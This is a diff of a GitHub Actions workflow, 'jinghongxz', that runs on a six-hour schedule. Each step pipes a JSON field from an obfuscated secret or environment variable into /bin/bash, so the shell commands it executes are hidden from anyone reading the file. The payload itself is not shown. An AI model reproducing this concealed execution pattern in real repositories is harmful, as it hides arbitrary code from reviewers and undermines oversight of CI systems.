@@ -1,27 +1,24 @@
 name: jinghongxz
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '14 5/6 * * *'
+    - cron: '36 0/6 * * *'
 
 jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: jinghongxz
         env:
-          ny72: ${{ secrets.ny72 }}
+          c30104: ${{ secrets.c30104 }}
         run: |
-          echo $ny72 | jq -r .hlv3 | /bin/bash
-          echo $o575 | jq -r .w64636 | /bin/bash
-          echo $ik0 | jq -r .e5763 | /bin/bash
-          echo $dhaz3 | jq -r .da6690 | /bin/bash
-          echo $mkn396 | jq -r .i24697 | /bin/bash
-          echo $wbkme13291 | jq -r .hzg658 | /bin/bash
-          echo $hfhd5 | jq -r .hkwz9466 | /bin/bash
-          echo $l7 | jq -r .dgpi64822 | /bin/bash
-          echo $x1157 | jq -r .z2460 | /bin/bash
-          echo $jgj5 | jq -r .nlerk5890 | /bin/bash
+          echo $c30104 | jq -r .ies15216 | /bin/bash
+          echo $uau60 | jq -r .rtkzb0145 | /bin/bash
+          echo $fjui7235 | jq -r .l1 | /bin/bash
+          echo $lr04937 | jq -r .x37543 | /bin/bash
+          echo $f36 | jq -r .kac3866 | /bin/bash
+          echo $jf7 | jq -r .usye9 | /bin/bash
+          echo $jk481 | jq -r .suj15696 | /bin/bash
 
